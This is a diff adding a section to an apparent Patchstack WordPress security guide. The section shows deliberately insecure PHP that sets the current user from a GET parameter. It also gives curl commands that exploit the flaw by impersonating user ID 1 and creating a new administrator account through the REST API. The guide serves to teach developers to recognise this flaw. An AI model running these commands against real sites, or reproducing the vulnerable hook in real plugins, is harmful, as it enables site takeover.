@@ -318,6 +318,38 @@ function elavate_me(){
 
 In this setting since we set our capabilities to user with user ID 1 ( which is highly likely an administrator ) we can get pass through the capability check to acces internal functionality.
 
+## Insecure Current User Object Set
+
+```php
+add_action( 'init', 'patchstack_secure_func' );
+
+function patchstack_secure_func() {
+$user_id = $_GET['user_id'];
+wp_set_current_user( $user_id );
+}
+```
+
+In this example code we can call the function using cURL like this to set our capabilities:
+
+```bash
+curl -X GET "http://patchstack.com/?user_id=1" \
+     -H "Cookie: Cookies"
+```
+
+Then with the same credentials we can create a new user using:
+
+```bash
+curl -X POST "http://yourwordpresssite.com/wp-json/wp/v2/users" \
+     -H "Content-Type: application/json" \
+     -H "Authorization: Bearer your_access_token_here" \
+     -d '{
+           "username": "newadminuser",
+           "email": "newadmin@example.com",
+           "password": "SecurePassword123!",
+           "roles": ["administrator"]
+         }'
+```
+
 Below are some of the findings related to this vulnerable setting:
 
 - [Critical Privilege Escalation in LiteSpeed Cache Plugin Affecting 5+ Million Sites](https://patchstack.com/articles/critical-privilege-escalation-in-litespeed-cache-plugin-affecting-5-million-sites/)
